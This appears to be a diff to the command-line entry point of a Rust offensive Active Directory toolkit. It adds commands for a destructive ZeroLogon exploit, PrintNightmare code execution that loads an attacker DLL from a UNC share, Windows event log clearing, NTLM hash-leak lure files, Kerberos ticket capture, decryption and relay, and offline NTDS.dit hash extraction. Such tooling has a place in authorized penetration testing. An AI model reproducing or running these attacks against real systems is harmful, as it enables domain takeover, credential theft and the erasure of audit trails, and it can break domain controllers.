@@ -387,6 +387,18 @@ enum Commands {
         action: KerberosAction,
     },
 
+    #[cfg(feature = "hunter")]
+    /// Describe a ticket"s contents (Kirbi/ccache/Raw TGT)
+    #[command(alias = "ticket")]
+    DescribeTicket {
+        /// Path to ticket file (kirbi, ccache, or raw ticket data)
+        #[arg(short, long, required = true)]
+        ticket: String,
+        /// Output format (json or human-readable)
+        #[arg(long, default_value = "human")]
+        format: String,
+    },
+
     /// SMB operations
     Smb {
         #[command(subcommand)]
@@ -409,7 +421,7 @@ enum Commands {
     /// Attack graph operations
     Graph {
         /// Load graph from JSON file instead of building from LDAP
-        #[arg(short, long, global = true)]
+        #[arg(long, global = true)]
         file: Option<String>,
         #[command(subcommand)]
         action: GraphAction,
@@ -468,6 +480,13 @@ enum Commands {
         /// Specific checks to run (smb, kerberos, winrm, network)
         #[arg(long, short, value_delimiter = ',')]
         checks: Vec<String>,
+    },
+
+    /// Scenario playbook -- ready-to-paste attack recipes (ovt playbook list|show)
+    #[command(alias = "cheatsheet")]
+    Playbook {
+        #[command(subcommand)]
+        action: commands::playbook::PlaybookAction,
     },
 
     /// Generate engagement report (Markdown, PDF, JSON)
@@ -675,6 +694,13 @@ enum Commands {
         action: commands::ldap::LdapAction,
     },
 
+    /// ADWS enumeration over WS-Trust NTLM (port 9389; bypasses LDAP hardening)
+    #[command(alias = "wsman")]
+    Adws {
+        #[command(subcommand)]
+        action: commands::adws::AdwsAction,
+    },
+
     /// NetExec-style multi-protocol host checker (smb/ldap/winrm/rpc)
     #[command(alias = "netexec", alias = "cme")]
     Nxc {
@@ -833,7 +859,7 @@ enum Commands {
         #[arg(short, long, required = true)]
         ca_server: String,
         /// CES/NDES enrollment URL (e.g. https://ca.domain.local/CES/)
-        #[arg(short, long)]
+        #[arg(long)]
         ces_url: Option<String>,
         /// Certificate template to request
         #[arg(long, default_value = "User")]
@@ -866,7 +892,24 @@ enum Commands {
         full: bool,
     },
 
+    /// Create or delete a domain computer account (Impacket addcomputer.py parity)
+    AddComputer {
+        /// Computer account name (without trailing $)
+        #[arg(short, long, required = true)]
+        name: String,
+        /// Password for the computer account (random 24 chars if omitted)
+        #[arg(long)]
+        password: Option<String>,
+        /// Target container DN (default: CN=Computers,<domain base>)
+        #[arg(long)]
+        container: Option<String>,
+        /// Delete the computer account instead of creating it
+        #[arg(long, default_value_t = false)]
+        delete: bool,
+    },
+
     /// Certifried (CVE-2022-26923) -- ADCS privilege escalation via dNSHostName spoofing
+    #[command(alias = "cve-2022-26923")]
     Certifried {
         /// CA server URL for Web Enrollment
         #[arg(short, long, required = true)]
@@ -988,6 +1031,32 @@ enum Commands {
         format: SherlockOutputFormatArg,
     },
 
+    /// Windows event log operations (clear/backup via MS-EVEN RPC primitives)
+    #[command(alias = "eventlog")]
+    Events {
+        #[command(subcommand)]
+        action: EventsAction,
+    },
+
+    /// ZeroLogon (CVE-2020-1472) -- Netlogon empty-password check, 1/256 probe, destructive exploit
+    #[command(alias = "cve-2020-1472")]
+    Zerologon {
+        #[command(subcommand)]
+        action: ZerologonAction,
+    },
+
+    /// PrintNightmare (CVE-2021-1675 / CVE-2021-34527) -- spooler RCE via RpcAddPrinterDriverEx
+    #[command(
+        alias = "nightmare",
+        alias = "pn",
+        alias = "cve-2021-1675",
+        alias = "cve-2021-34527"
+    )]
+    Printnightmare {
+        #[command(subcommand)]
+        action: PrintnightmareAction,
+    },
+
     /// Generate shell tab-completion scripts
     #[command(name = "completions", alias = "completion", hide = true)]
     Completions {
@@ -1038,6 +1107,11 @@ enum EdrAction {
 #[derive(Subcommand, Clone)]
 enum ExploitAction {
     /// CVE-2021-42278/42287 -- sAMAccountName spoofing + KDC confusion (domain admin)
+    #[command(
+        alias = "samnamespoof",
+        alias = "cve-2021-42278",
+        alias = "nopac-spoof"
+    )]
     SamNameSpoof {
         /// DC sAMAccountName to spoof (e.g. DC01$)
         #[arg(long)]
@@ -1047,6 +1121,7 @@ enum ExploitAction {
         password: String,
     },
     /// Shadow Credentials -- write msDS-KeyCredentialLink + PKINIT auth
+    #[command(alias = "shadow-credentials", alias = "keycred")]
     ShadowCred {
         /// Target DN to attack (e.g. CN=TargetUser,CN=Users,DC=corp,DC=local)
         #[arg(long)]
@@ -1086,6 +1161,124 @@ enum CleanupTarget {
     ShadowCred,
     /// Remove msDS-AllowedToActOnBehalfOfOtherIdentity
     Rbcd,
+}
+
+// ----------------------------------------------------------
+// ZeroLogon / PrintNightmare sub-commands
+// ----------------------------------------------------------
+
+#[derive(Subcommand, Debug, Clone)]
+enum ZerologonAction {
+    /// Deterministic check: authenticate as the DC's machine account with an
+    /// EMPTY password (only flags DCs whose machine password is already empty)
+    Check {
+        /// Target DC IP or hostname
+        #[arg(short, long, required = true)]
+        target: String,
+        /// DC machine name (NetBIOS, no $). Derived from the target if omitted
+        #[arg(long)]
+        computer_name: Option<String>,
+    },
+    /// Non-destructive probabilistic probe: all-zero credential brute force
+    /// (1/256 success chance per attempt, ~256 expected; noisy -- one failed
+    /// logon event per attempt)
+    Probe {
+        /// Target DC IP or hostname
+        #[arg(short, long, required = true)]
+        target: String,
+        /// DC machine name (NetBIOS, no $). Derived from the target if omitted
+        #[arg(long)]
+        computer_name: Option<String>,
+        /// Maximum probe attempts
+        #[arg(long, default_value = "2000")]
+        max_attempts: u32,
+    },
+    /// Full destructive exploit: auth-bypass brute force, then
+    /// NetrServerPasswordSet2 empties the DC's machine account password.
+    /// The domain's Netlogon secure channel breaks until the password is
+    /// restored -- follow the printed DCSync + restore guidance immediately.
+    Exploit {
+        /// Target DC IP or hostname
+        #[arg(short, long, required = true)]
+        target: String,
+        /// DC machine name (NetBIOS, no $). Derived from the target if omitted
+        #[arg(long)]
+        computer_name: Option<String>,
+        /// Maximum attempts per phase (average ~256 when vulnerable)
+        #[arg(long, default_value = "2000")]
+        max_attempts: u32,
+        /// Proceed without the destructive-operation confirmation gate
+        #[arg(long, default_value_t = false)]
+        force: bool,
+    },
+}
+
+#[derive(Subcommand, Debug, Clone)]
+enum PrintnightmareAction {
+    /// Classify the spooler: invalid RpcAddPrinterDriverEx, parse the status
+    Check {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+    },
+    /// Install a driver whose paths point at an attacker-controlled UNC
+    /// share -- the spooler loads the DLL as SYSTEM
+    Exploit {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+        /// UNC path to the attacker DLL (e.g. \\10.0.0.1\share\evil.dll)
+        #[arg(long, required = true)]
+        dll: String,
+        /// Driver name to register on the target
+        #[arg(long, default_value = "PN_RCE")]
+        driver_name: String,
+    },
+    /// Remove a previously-installed malicious driver
+    Delete {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Driver name to delete
+        #[arg(long, default_value = "PN_RCE")]
+        driver_name: String,
+    },
+    /// Enumerate installed printer drivers (RpcEnumPrinterDrivers, DRIVER_INFO_2)
+    List {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+    },
+}
+
+#[derive(Subcommand, Debug, Clone)]
+enum EventsAction {
+    /// Clear (truncate) a Windows event log via the MS-EVEN RPC
+    /// ElfrClearLogFileW primitive (CVE-2025-29969-style CreateFile abuse)
+    Clear {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Log name without .evtx extension (e.g. Application, System, Security)
+        #[arg(short, long, default_value = "System")]
+        log_name: String,
+        /// Custom full target path (overrides --log-name)
+        #[arg(long)]
+        path: Option<String>,
+    },
+    /// Back up (copy) a Windows event log to a remote path via the MS-EVEN
+    /// RPC ElfrBackupEventLogW primitive (rarely blocked alternative)
+    Backup {
+        /// Target host (FQDN or IP)
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Log name without .evtx extension
+        #[arg(short, long, default_value = "System")]
+        log_name: String,
+        /// Destination path on the remote host (e.g. C:\Windows\Temp\copy.evtx)
+        #[arg(long, required = true)]
+        path: String,
+    },
 }
 
 // ----------------------------------------------------------
@@ -1350,8 +1543,8 @@ enum AdcsAction {
         #[arg(short = 'M', long, required = true)]
         mapping: String,
         /// DC IP/hostname for LDAP modification
-        #[arg(short, long)]
-        dc: Option<String>,
+        #[arg(long)]
+        ldap_host: Option<String>,
         /// LIVE Perform live LDAP modification (requires ldap-user/ldap-pass)
         #[arg(long)]
         live: bool,
@@ -1523,6 +1716,8 @@ enum ScanType {
     /// SYN scan (requires raw sockets/root)
     Syn,
     /// TCP connect scan
+    // ADWS scan (WS-Trust over HTTPS, port 9389)
+    Adws,
     Connect,
     /// ACK scan (firewall mapping)
     Ack,
@@ -2585,7 +2780,7 @@ enum NtlmAction {
         #[arg(long)]
         socks5_proxy: Option<String>,
     },
-    /// Standalone SMB daemon for credential capture
+    /// Standalone SMB daemon for credential capture or file serving
     #[command(alias = "smbd")]
     SmbDaemon {
         /// Network interface to listen on
@@ -2597,12 +2792,41 @@ enum NtlmAction {
         /// Custom NTLM challenge as 16-character hex string
         #[arg(long, value_parser = parse_hex_challenge)]
         challenge: Option<[u8; 8]>,
+        /// Serve a local directory as an SMB file share (impacket
+        /// smbserver.py parity) -- e.g. payload hosting for PrintNightmare.
+        /// Credentials are still captured on every session setup.
+        #[arg(long = "share-root")]
+        share_root: Option<String>,
+        /// Share name advertised over the wire (default: payloads)
+        #[arg(long = "share-name", default_value = "payloads")]
+        share_name: String,
         /// Output format for captured credentials
         #[arg(long = "hash-format", value_enum, default_value = "summary")]
         hash_format: SmbDaemonOutputFormat,
         /// Write captured hashes to file (appended)
         #[arg(short, long)]
         output_file: Option<String>,
+        /// krbrelayx parity: advertise the Kerberos V5 SASL mech in session
+        /// setup responses so Kerberos-aware clients hand over AP-REQ tickets
+        /// instead of NTLM. Captured tickets are written as .kirbi files.
+        #[arg(long = "krb5-capture")]
+        krb5_capture: bool,
+        /// Hex-encoded key (RC4 16B / AES128 16B / AES256 32B) used to decrypt
+        /// captured AP-REQ tickets inline (e.g. the KRBTGT AES256 key from a
+        /// DCSync, or a service account key from kerberoasting). When given,
+        /// successful decrypts produce complete pass-the-ticket .kirbi files
+        /// (session key + client principal embedded).
+        #[arg(long = "krb-key")]
+        krb_key: Option<String>,
+        /// Directory to write captured .kirbi files into (default: .)
+        #[arg(long = "ticket-dir", default_value = ".")]
+        ticket_dir: String,
+        /// krbrelayx --relay parity: forward every captured AP-REQ to this
+        /// target and authenticate as the victim. URI form with scheme
+        /// required: ldap://DC1:389, ldaps://DC1:636, http://WEB:80,
+        /// https://WEB:443. Implies --krb5-capture.
+        #[arg(long = "krb-relay")]
+        krb_relay: Option<String>,
     },
     /// TLS-wrapped NTLM relay with optional mTLS client certificate verification
     TlsRelay {
@@ -2685,6 +2909,25 @@ enum NtlmAction {
         /// Target URL to redirect victims to after login
         #[arg(long)]
         redirect_url: Option<String>,
+    },
+    /// Generate hash-disclosure (NTLM leak) artifacts: CVE-2025-24054,
+    /// CVE-2025-24071, CVE-2024-43451. Drop the generated files on a share /
+    /// archive that the victim user is likely to interact with; Explorer
+    /// authenticates to the attacker UNC path, leaking NTLMv2 hashes.
+    Leak {
+        /// Attacker UNC share (e.g. \\\\10.0.0.1\\leak)
+        #[arg(long)]
+        unc: String,
+        /// Directory to write the artifacts into (default: current directory)
+        #[arg(short, long)]
+        output_dir: Option<String>,
+        /// Only generate specific formats
+        /// (library-ms, searchconnector-ms, url, website, scf, lnk)
+        #[arg(short, long, value_delimiter = ',')]
+        formats: Vec<String>,
+        /// Print base64 of each file instead of writing to disk
+        #[arg(long)]
+        bundle: bool,
     },
 }
 
@@ -3035,6 +3278,30 @@ enum SecretsAction {
         #[arg(long, required = true)]
         system: String,
     },
+    /// Offline NTDS.dit parse (ESE database -> domain hashes)
+    ///
+    /// Impacket secretsdump parity for the "steal the dit + SYSTEM offline"
+    /// workflow. Parses the ESENT page tree, decrypts the PEK list (RC4
+    /// legacy + WS2016+ AES), and emits secretsdump-format hash lines plus
+    /// Kerberos AES keys / WDigest / cleartext from supplementalCredentials.
+    #[command(alias = "ntds")]
+    NtdsDit {
+        /// Path to NTDS.dit (or an esentutl-cleaned copy)
+        #[arg(short, long, required = true)]
+        ntds: String,
+        /// Path to the SYSTEM registry hive (extracts the boot key)
+        #[arg(long)]
+        system: Option<String>,
+        /// Boot key as 32 hex chars (overrides --system)
+        #[arg(long)]
+        bootkey: Option<String>,
+        /// Write secretsdump-format output to file (default: stdout only)
+        #[arg(short, long)]
+        output: Option<String>,
+        /// Include tombstoned (deleted) records
+        #[arg(long)]
+        include_deleted: bool,
+    },
 }
 
 // ----------------------------------------------------------
@@ -3354,6 +3621,11 @@ async fn async_main() -> i32 {
         Commands::Guid { ref action } => cmd_guid(action.clone()),
         #[cfg(feature = "hunter")]
         Commands::Kerberos { ref action } => cmd_kerberos(&cli, action.clone()).await,
+        #[cfg(feature = "hunter")]
+        Commands::DescribeTicket {
+            ref ticket,
+            ref format,
+        } => commands_impl::cmd_describe_ticket(&cli, ticket, Some(format)).await,
         Commands::Smb { ref action } => cmd_smb(&cli, action.clone()).await,
         Commands::Exec {
             ref method,
@@ -3413,6 +3685,10 @@ async fn async_main() -> i32 {
             };
             commands::doctor::run(checks_opt, cli.dc_host.as_deref()).await
         }
+        Commands::Playbook { ref action } => match action {
+            commands::playbook::PlaybookAction::List => commands::playbook::cmd_list(),
+            commands::playbook::PlaybookAction::Show { name } => commands::playbook::cmd_show(name),
+        },
         #[cfg(feature = "scribe")]
         Commands::Report {
             ref input,
@@ -3498,6 +3774,7 @@ async fn async_main() -> i32 {
         }
         Commands::Rpc { ref action } => commands::rpc::cmd_rpc(&cli, action.clone()).await,
         Commands::Ldap { ref action } => commands::ldap::cmd_ldap(&cli, action.clone()).await,
+        Commands::Adws { ref action } => commands::adws::cmd_adws(&cli, action.clone()).await,
         Commands::Nxc {
             protocol,
             ref targets,
@@ -3649,6 +3926,21 @@ async fn async_main() -> i32 {
         }
 
         // --- Certifried (CVE-2022-26923) ADCS privilege escalation ---
+        Commands::AddComputer {
+            ref name,
+            ref password,
+            ref container,
+            delete,
+        } => {
+            commands_impl::cmd_add_computer(
+                &cli,
+                name,
+                password.as_deref(),
+                container.as_deref(),
+                delete,
+            )
+            .await
+        }
         Commands::Certifried {
             ref ca_url,
             ref target_dc_fqdn,
@@ -3747,6 +4039,17 @@ async fn async_main() -> i32 {
                 format.into(),
             )
             .await
+        }
+
+        // --- Windows event log ops (MS-EVEN) ---
+        Commands::Events { ref action } => commands_impl::cmd_events(&cli, action).await,
+
+        // --- ZeroLogon (CVE-2020-1472) ---
+        Commands::Zerologon { ref action } => commands_impl::cmd_zerologon(&cli, action).await,
+
+        // --- PrintNightmare (CVE-2021-1675 / CVE-2021-34527) ---
+        Commands::Printnightmare { ref action } => {
+            commands_impl::cmd_printnightmare(&cli, action).await
         }
 
         // --- Shell completion generation ---------------------
@@ -4749,7 +5052,7 @@ fn parse_hex_challenge(s: &str) -> Result<[u8; 8], String> {
 }
 
 /// Parse relay target strings in `protocol://host:port` or `host:port` format.
-/// Supports protocols: smb, http, https, ldap, ldaps, mssql, msmq, exchange.
+/// Supports protocols: smb, http, https, ldap, ldaps, mssql, msmq, smtp, exchange.
 fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget> {
     use overthrone_relay::{Protocol, RelayTarget};
     use std::net::SocketAddr;
@@ -4768,6 +5071,8 @@ fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget>
                     "ldaps" => Protocol::Ldaps,
                     "mssql" => Protocol::Mssql,
                     "msmq" => Protocol::Msmq,
+                    "smtp" => Protocol::Smtp,
+                    "imap" => Protocol::Imap,
                     "exchange" => Protocol::Exchange,
                     _ => return None,
                 };
@@ -4786,6 +5091,8 @@ fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget>
                     Some(Protocol::Ldaps) => 636,
                     Some(Protocol::Mssql) => 1433,
                     Some(Protocol::Msmq) => 1801,
+                    Some(Protocol::Smtp) => 587,
+                    Some(Protocol::Imap) => 143,
                     _ => 80,
                 });
             let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
@@ -4793,6 +5100,8 @@ fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget>
                 443 => Protocol::Https,
                 445 => Protocol::Smb,
                 389 | 636 => Protocol::Ldap,
+                25 | 587 => Protocol::Smtp,
+                143 => Protocol::Imap,
                 _ => Protocol::Smb,
             });
             Some(RelayTarget {
@@ -4872,6 +5181,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 analyze_only: analyze,
                 poison_ip,
                 wpad_config,
+                post_auth_command: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -4956,6 +5266,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 })
                 .collect();
 
+            let armed_command = command.clone();
             let config = RelayControllerConfig {
                 interface: "0.0.0.0".to_string(),
                 llmnr: true,
@@ -4986,14 +5297,19 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 analyze_only: false,
                 poison_ip: None,
                 wpad_config: None,
+                post_auth_command: command,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
                 Ok(_) => match controller.start().await {
                     Ok(_) => {
                         banner::print_success("HTTP relay started");
-                        if let Some(cmd) = command {
-                            println!("{} Will execute: {}", "!".bright_black(), cmd.yellow());
+                        if let Some(cmd) = armed_command {
+                            println!(
+                                "{} Post-auth command armed: {}",
+                                "!".bright_black(),
+                                cmd.yellow()
+                            );
                         }
                         0
                     }
@@ -5056,6 +5372,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     })
                 })
                 .collect();
+            let armed_command = command.clone();
             let config = RelayControllerConfig {
                 interface: "0.0.0.0".to_string(),
                 llmnr: true,
@@ -5086,13 +5403,18 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 analyze_only: false,
                 poison_ip: None,
                 wpad_config: None,
+                post_auth_command: command,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
                 Ok(_) => match controller.start().await {
                     Ok(_) => {
-                        if let Some(cmd) = command {
-                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
+                        if let Some(cmd) = armed_command {
+                            println!(
+                                "{} Post-auth command armed: {}",
+                                "s".bright_black(),
+                                cmd.yellow()
+                            );
                         }
                         banner::print_success("SMB relay started");
                         0
@@ -5160,6 +5482,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     })
                 })
                 .collect();
+            let armed_command = command.clone();
             let config = RelayControllerConfig {
                 interface: "0.0.0.0".to_string(),
                 llmnr: true,
@@ -5190,13 +5513,18 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 analyze_only: false,
                 poison_ip: None,
                 wpad_config: None,
+                post_auth_command: command,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
                 Ok(_) => match controller.start().await {
                     Ok(_) => {
-                        if let Some(cmd) = command {
-                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
+                        if let Some(cmd) = armed_command {
+                            println!(
+                                "{} Post-auth command armed: {}",
+                                "s".bright_black(),
+                                cmd.yellow()
+                            );
                         }
                         banner::print_success("HTTP relay started");
                         0
@@ -5245,6 +5573,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                             "ldaps" => Protocol::Ldaps,
                             "mssql" => Protocol::Mssql,
                             "msmq" => Protocol::Msmq,
+                            "smtp" => Protocol::Smtp,
+                            "imap" => Protocol::Imap,
                             "exchange" => Protocol::Exchange,
                             _ => return None,
                         };
@@ -5261,6 +5591,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                             Some(Protocol::Ldaps) => 636,
                             Some(Protocol::Mssql) => 1433,
                             Some(Protocol::Msmq) => 1801,
+                            Some(Protocol::Smtp) => 587,
+                            Some(Protocol::Imap) => 143,
                             _ => 80,
                         },
                     );
@@ -5269,6 +5601,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                         443 => Protocol::Https,
                         445 => Protocol::Smb,
                         389 | 636 => Protocol::Ldap,
+                        25 | 587 => Protocol::Smtp,
+                        143 => Protocol::Imap,
                         _ => Protocol::Smb,
                     });
                     Some(RelayTarget {
@@ -5292,6 +5626,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 ldap_signing_bypass: true,
                 max_retries: 3,
                 timeout_secs: 30,
+                post_auth_command: None,
             };
             let mut relay = HttpAsymmetricRelay::new(config);
             match relay.start().await {
@@ -5405,6 +5740,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 analyze_only: false,
                 poison_ip: None,
                 wpad_config: None,
+                post_auth_command: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -5428,10 +5764,29 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             interface,
             port,
             challenge,
+            share_root,
+            share_name,
             hash_format,
             output_file,
+            krb5_capture,
+            krb_key,
+            ticket_dir,
+            krb_relay,
         } => {
-            banner::print_module_banner("SMB DAEMON");
+            if let Some(ref root) = share_root
+                && !std::path::Path::new(root).is_dir()
+            {
+                banner::print_fail(&format!(
+                    "Share root does not exist or is not a directory: {}",
+                    root
+                ));
+                return 1;
+            }
+            banner::print_module_banner(if share_root.is_some() {
+                "SMB SERVER (FILE SHARE)"
+            } else {
+                "SMB DAEMON"
+            });
             println!(
                 "{} Starting SMB2 daemon on {}:{}",
                 "".bright_black(),
@@ -5439,16 +5794,102 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 port
             );
 
-            use overthrone_relay::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
+            use overthrone_relay::{Protocol, SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
 
+            // krbrelayx --relay parity: parse + validate the relay target.
+            let krb_relay_target = match krb_relay.as_deref() {
+                Some(spec) => {
+                    let parsed = parse_relay_targets(&[spec.to_string()]);
+                    let target = match parsed.into_iter().next() {
+                        Some(t) => t,
+                        None => {
+                            banner::print_fail(&format!(
+                                "--krb-relay: cannot parse '{}' (use ldap://host / ldaps://host / http://host / https://host)",
+                                spec
+                            ));
+                            return 1;
+                        }
+                    };
+                    match target.protocol {
+                        Protocol::Ldap | Protocol::Ldaps | Protocol::Http | Protocol::Https => {
+                            banner::print_success(&format!(
+                                "Kerberos relay armed -> {} (captured AP-REQs authenticate as the victim)",
+                                target.address
+                            ));
+                            Some(target)
+                        }
+                        other => {
+                            banner::print_fail(&format!(
+                                "--krb-relay: protocol {other} not supported for AP-REQ forwarding; use ldap:// ldaps:// http:// https://"
+                            ));
+                            return 1;
+                        }
+                    }
+                }
+                None => None,
+            };
+            let krb5_capture = krb5_capture || krb_relay_target.is_some();
+
+            let mode = match share_root {
+                Some(ref root) => SmbDaemonMode::FileShare {
+                    share_name: share_name.clone(),
+                    share_root: std::path::PathBuf::from(root),
+                },
+                None => SmbDaemonMode::Capture,
+            };
+
+            // Parse the optional decryption key once (plain hex -> raw bytes)
+            let krb_key_bytes = match krb_key.as_deref() {
+                Some(hexstr) => match hex::decode(hexstr.trim().trim_start_matches("0x")) {
+                    Ok(key) => {
+                        if key.len() != 16 && key.len() != 32 {
+                            banner::print_fail(&format!(
+                                "--krb-key must be 32 hex chars (RC4/AES128) or 64 hex chars (AES256), got {} bytes",
+                                key.len()
+                            ));
+                            return 1;
+                        }
+                        banner::print_success(&format!(
+                            "Kerberos ticket decryption enabled with {}-byte key",
+                            key.len()
+                        ));
+                        Some(key)
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("--krb-key is not valid hex: {e}"));
+                        return 1;
+                    }
+                },
+                None => None,
+            };
+            if krb5_capture {
+                banner::print_success(
+                    "Kerberos capture enabled -- advertising krb5 SASL mech (krbrelayx mode)",
+                );
+                if krb_key_bytes.is_none() {
+                    banner::print_info(
+                        "Tickets are stored undecrypted. Provide --krb-key (krbtgt/service key) to emit pass-the-ticket .kirbi files inline.",
+                    );
+                }
+            }
             let config = SmbDaemonConfig {
                 listen_ip: interface.clone(),
                 listen_port: port,
                 challenge,
-                mode: SmbDaemonMode::Capture,
+                mode,
                 domain_name: "LAN".to_string(),
                 socks5_proxy: None,
+                capture_kerberos: krb5_capture,
+                krb_relay_target: krb_relay_target.clone(),
             };
+            if share_root.is_some() {
+                banner::print_success(&format!(
+                    "Serving share '{}\\{}' -> {} (credential capture active)",
+                    interface,
+                    share_name,
+                    share_root.as_deref().unwrap_or("?")
+                ));
+            }
             let mut daemon = SmbDaemon::new(config);
             match daemon.start().await {
                 Ok(_) => {
@@ -5512,6 +5953,104 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                             ));
                         }
                     }
+
+                    // ---- Kerberos ticket capture (krbrelayx mode) ----
+                    let tickets = daemon.get_captured_tickets();
+                    if !tickets.is_empty() {
+                        println!();
+                        banner::print_success(&format!(
+                            "Captured {} Kerberos ticket(s)",
+                            tickets.len()
+                        ));
+                        if let Err(e) = std::fs::create_dir_all(&ticket_dir) {
+                            banner::print_fail(&format!(
+                                "Cannot create ticket dir {ticket_dir}: {e}"
+                            ));
+                        }
+                        for (i, t) in tickets.iter().enumerate() {
+                            let kind = if t
+                                .sname
+                                .first()
+                                .map(|s| s.eq_ignore_ascii_case("krbtgt"))
+                                .unwrap_or(false)
+                            {
+                                "TGT"
+                            } else {
+                                "ST"
+                            };
+                            println!(
+                                " [{kind}] {}@{} from {} (etype {}, kvno {})",
+                                t.sname.join("/").green(),
+                                t.realm.cyan(),
+                                t.source,
+                                t.etype,
+                                t.kvno
+                            );
+
+                            // Try inline decryption when a key was supplied.
+                            let mut wrote_plain = false;
+                            if let Some(ref key) = krb_key_bytes {
+                                let info = overthrone_relay::krb_capture::TicketInfo {
+                                    ticket_blob: t.ticket_blob.clone(),
+                                    realm: t.realm.clone(),
+                                    sname: t.sname.clone(),
+                                    name_type: t.name_type,
+                                    etype: t.etype,
+                                    kvno: t.kvno,
+                                    cipher: t.cipher.clone(),
+                                };
+                                if let Some(dec) =
+                                    overthrone_relay::krb_capture::decrypt_ticket(&info, key)
+                                {
+                                    banner::print_success(&format!(
+                                        "  Decrypted: client {}@{}, session key {} (etype {}) -- pass-the-ticket ready",
+                                        dec.client_name.join("/"),
+                                        dec.client_realm,
+                                        dec.session_key_hex,
+                                        dec.session_key_etype
+                                    ));
+                                    let path = std::path::Path::new(&ticket_dir).join(format!(
+                                        "ptt_{}_{}.kirbi",
+                                        i,
+                                        dec.client_name.join("_")
+                                    ));
+                                    match std::fs::write(&path, &dec.kirbi) {
+                                        Ok(_) => {
+                                            banner::print_success(&format!(
+                                                "  Wrote {}",
+                                                path.display()
+                                            ));
+                                            wrote_plain = true;
+                                        }
+                                        Err(e) => {
+                                            banner::print_fail(&format!("  Write failed: {e}"))
+                                        }
+                                    }
+                                } else {
+                                    banner::print_warn(
+                                        "  Key did not decrypt ticket (wrong key or etype)",
+                                    );
+                                }
+                            }
+
+                            // Always write the raw capture .kirbi when no
+                            // complete one was produced.
+                            if !wrote_plain {
+                                let path = std::path::Path::new(&ticket_dir).join(format!(
+                                    "ticket_{}_{}.kirbi",
+                                    i,
+                                    t.realm.to_lowercase()
+                                ));
+                                match std::fs::write(&path, &t.kirbi) {
+                                    Ok(_) => banner::print_success(&format!(
+                                        "  Wrote {} (offline decrypt to complete)",
+                                        path.display()
+                                    )),
+                                    Err(e) => banner::print_fail(&format!("  Write failed: {e}")),
+                                }
+                            }
+                        }
+                    }
                     0
                 }
                 Err(e) => {
@@ -5564,6 +6103,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 max_retries: 3,
                 timeout_secs: 30,
                 cbt_mode: cbt_mode_parsed,
+                post_auth_command: None,
             };
             let mut relay = TlsRelay::new(config);
             match relay.start().await {
@@ -5707,6 +6247,105 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 Err(e) => {
                     banner::print_fail(&format!("Captive portal failed: {}", e));
                     1
+                }
+            }
+        }
+        NtlmAction::Leak {
+            unc,
+            output_dir,
+            formats,
+            bundle,
+        } => {
+            use overthrone_core::proto::ntlm_leak::{
+                NtlmLeakFormat, generate_ntlm_leak_bundle, write_ntlm_leak_files,
+            };
+
+            banner::print_module_banner("NTLM LEAK GENERATOR");
+            if let Some(dir) = &output_dir {
+                banner::print_info(&format!("Output directory: {dir}"));
+            }
+
+            match (bundle, formats.is_empty()) {
+                (true, true) => {
+                    // base64 bundle of all formats
+                    match generate_ntlm_leak_bundle(&unc) {
+                        Ok(files) => {
+                            banner::print_success(&format!(
+                                "{} artifacts generated for {}",
+                                files.len(),
+                                unc.cyan()
+                            ));
+                            for f in &files {
+                                use base64::Engine;
+                                println!("--- {} ---", f.filename.bright_cyan());
+                                println!(
+                                    "{}",
+                                    base64::engine::general_purpose::STANDARD.encode(&f.content)
+                                );
+                            }
+                            0
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Bundle failed: {e}"));
+                            1
+                        }
+                    }
+                }
+                (true, false) => {
+                    banner::print_fail("--bundle and --formats are mutually exclusive");
+                    1
+                }
+                (false, _) => {
+                    let selected: Vec<NtlmLeakFormat> = if formats.is_empty() {
+                        NtlmLeakFormat::all().to_vec()
+                    } else {
+                        let mut parsed = Vec::new();
+                        let mut invalid = None;
+                        for f in &formats {
+                            match NtlmLeakFormat::from_name(f) {
+                                Some(fmt) => parsed.push(fmt),
+                                None => {
+                                    invalid = Some(f.clone());
+                                    break;
+                                }
+                            }
+                        }
+                        if let Some(bad) = invalid {
+                            banner::print_fail(&format!(
+                                "Unknown format '{bad}' -- valid: library-ms, \
+                                 searchconnector-ms, url, website, scf, lnk"
